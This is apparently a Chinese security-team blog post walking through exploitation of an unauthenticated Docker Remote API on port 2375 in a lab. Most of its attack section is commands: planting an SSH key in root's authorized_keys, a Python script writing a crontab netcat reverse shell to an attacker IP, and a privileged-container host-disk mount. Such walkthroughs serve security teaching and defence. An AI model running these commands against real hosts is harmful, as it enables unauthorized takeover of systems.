#  Docker Remote API未授权访问与逃逸RCE 分析  
原创 晨星安全团队
                    晨星安全团队  晨星安全团队   2026-03-23 02:22  
  
# Docker Remote API未授权访问逃逸RCE  
  
Docker 是一个提供容器化软件打包和交付的平台即服务（PaaS）解决方案。  
## 漏洞原理  
  
Docker 守护进程（dockerd）提供了一个 REST API，允许远程管理 Docker 容器、镜像和其他资源。  
  
当 Docker 守护进程被配置为监听网络端口（通常是 TCP 端口 2375）且未启用适当的身份验证机制时，攻击者 可以未经授权访问 Docker API，执行 docker 命令。  
  
利用此漏洞，攻击者可以在主机系统上创建、修改和执行容器，可能导致远程代码执行、数据窃取以及完全控制主机系统。  
## 漏洞检测  
  
访问 http://ip:2375/version  
 发现存在未授权  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZCjMVth9QjhEX1pCNH3pxMTermLVdYEWTV49icFlx44Op3Fia92ia0zsySTVI8ID5okicZK5TFBibUrpfNic2zdicuJlLwjtP2gZbl1JNOXbwI9nXA/640?wx_fmt=png&from=appmsg "")  
  
执行 docker 命令  
```
sudo docker -H tcp://127.0.0.1:2375 imagessudo docker -H tcp://127.0.0.1:2375 ps -a
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZCjMVth9Qjh26neC2enI7jp5JBoDQOBmbMAcTQicw5Z4EUD3wiaSU4CgI7t7kb8soUedVtfBWGY0RW2CAawPdBPeYp2SwVVIl2Z73X8FSIozc/640?wx_fmt=png&from=appmsg "")  
## 提权方法  
### 第一种：写入SSH公钥  
  
启动一个容器，挂载宿主机的 /root/  
目录，之后将攻击者的 SSH 公钥 ~/.ssh/id_rsa.pub  
 的内容写到入宿主机的 /root/.ssh/authorized_keys  
 文件中，之后就可以用 root 账户直接登录了  
  
本地获取 SSH 公钥  
```
ssh-keygen -t rsa
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZCjMVth9QjhMWl0sxysRm8QWddYiafl7RnWpN3N4IgRgPWTYf9sSQj85r2e9B7ygXLyIlZCDGgjJVkKoUtQ6GxjDXJr6YoI7KJ4I6PQbz1BM/640?wx_fmt=png&from=appmsg "")  
  
将公钥复制到被攻击者的 /root/.ssh/authorized_keys  
 文件中然后远程连接  
### 第二种：crontab反弹Shell  
```
import dockerclient = docker.DockerClient(base_url='http://192.168.X.X:2375/')data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * */usr/bin/nc 192.168.X.X 1111 -e /bin/sh' >> /tmp/etc/crontabs/root" ''',remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})# 意思是：使用Docker随意启动一个容器，并将宿主机的 /etc 目录挂载到容器中，便可以任意读写文件了# 可以将命令写入 crontab 配置文件，进行反弹shell
```  
### 第三种：通过容器  
  
去官方下载一个镜像文件 alpine  
```
docker -H tcp://192.168.241.142:2375 pull alpine
```  
  
接下来启动容器，并进入 alpine 容器  
```
docker -H tcp://192.168.241.142:2375 imagesdocker -H tcp://192.168.241.142:2375 run -it --privileged alpine /bin/sh#在 kali 中启动一个有交互的shell，并且是特权镜像#当操作者执行 docker run —privileged 时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux 的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZCjMVth9QjhvoqHfrNMk3sMSVqun15gH3YeziagvtZ8uIf1dkSiabGZnNpHOIibQk1J12BpTKoJY2wpIRQkknghaOvnJIKhiaLxeGJaB8dBIDTo/640?wx_fmt=png&from=appmsg "")  
  
进入容器后，使用fdisk -l  
命令查看磁盘文件  
  
**注意：在特权模式下，逃逸的方式很多；比如：直接在容器内部挂载宿主机磁盘，然后切换根目录**  
  
从返回的信息中可以判断出，/dev/sda5  
是主分区，那么接下来直接在容器内部挂载宿主机磁盘  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZCjMVth9QjiagKYttXSVG6BK9Xe7pSWd7NzoyIGlK60VlxEwOfGib5B21uRIE33VIokfzx6icDMgTiax1pZhrNHXCJjJTaCqicFVrF5Bw7GSScYI/640?wx_fmt=png&from=appmsg "")  
  
挂在磁盘到新建目录  
```
mkdir /wxiaogemount /dev/sda5 /wxiaogecd wxiaoge/touch wxiaoge.txt
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZCjMVth9Qjiamib83MYY4pkRldBT0Eup5KWjTRZ9via4vf80rHFsiajncjRN3xHicpdic918iah7G5KrOnL0EYJQYCLEhKeA4DCczD5dN13M3MQWsw/640?wx_fmt=png&from=appmsg "")  
  
接下来看一下靶机中确实创建了wxiaoge.txt  
文件，docker 逃逸成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZCjMVth9QjjnibIuplyFoyLOdeSonT0MrXWQichy4Q1EbOIpufjAv59Dyo0M3MM6e4k1gHrYric9b5SXSVUHvqibadIMOslSIXoWFCEZnZ0x6Qg/640?wx_fmt=png&from=appmsg "")  
  
接下来可以反弹主机Shell，创建xxx.sh  
文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZCjMVth9QjhPAlN4mgK13gZ6NnLE29DGfBrBu2GvrPUVu59bM5dnic5nyfeeJhq5spowwIm74ibicIktMibzia9ia6W2kHoP4bsgeLGESnvolUrvI/640?wx_fmt=png&from=appmsg "")  
  
添加执行权限，并且写入到定时任务中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZCjMVth9QjhWSITE561wbN8usXy3XHwl9LMa3Voml4t3kFEKHsUyIvahJZE8QE8eaq0iaEYOYiaHHdBNxR1dXVN79BvrVX9u6rFhVmdmlicRLs/640?wx_fmt=png&from=appmsg "")  
  
打开监听端口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZCjMVth9Qjh0BpATUYqfQtaSYz9GZiaWFdTibXGcdkSLtRQZnmPBRGnYILovlNR833lzA3Up7nHGvqLFYEQXgicQdbhrQUy0ibxAp8Ieq9HibJsM/640?wx_fmt=png&from=appmsg "")  
  
一分钟后收到 Shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZCjMVth9Qjj3hvPcIuJ2RIj5Zh7BBOtgYTe2vMFBOOUpLibfsNCS3NMCMZuzVzwczZztpMgfln4xo0HZtaCVTQdPicQN001ic7sPU3PgtEH62w/640?wx_fmt=png&from=appmsg "")  
  
  
作者：晨星安全团队——雾島风起時## 团队介绍  
  
晨星安全团队由多个高校毕业生及在校生组建，专注网络安全技术赋能。依托星禾团队技术基底，打造“学-练-赛-聘”闭环体系，提供CTF系统课程、自研靶场、赛事指导及大厂内推资源，构建从入门到就业的实战型人才孵化生态。  
  
无论你是零基础爱好者还是技术达人，欢迎加入我们，共同探索网络安全的无限可能！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ZCjMVth9Qjhicls9VlyHs8kqeWZDRuicdIYl1HFdkp4s9DezBJz0hqbgf1UTVbkCV5tOqKh5aolTV1TNTZKRltA2KfnLfmTNBCuk71gZ6M5Os/640?wx_fmt=jpeg "")  
  
**-END-**  
  
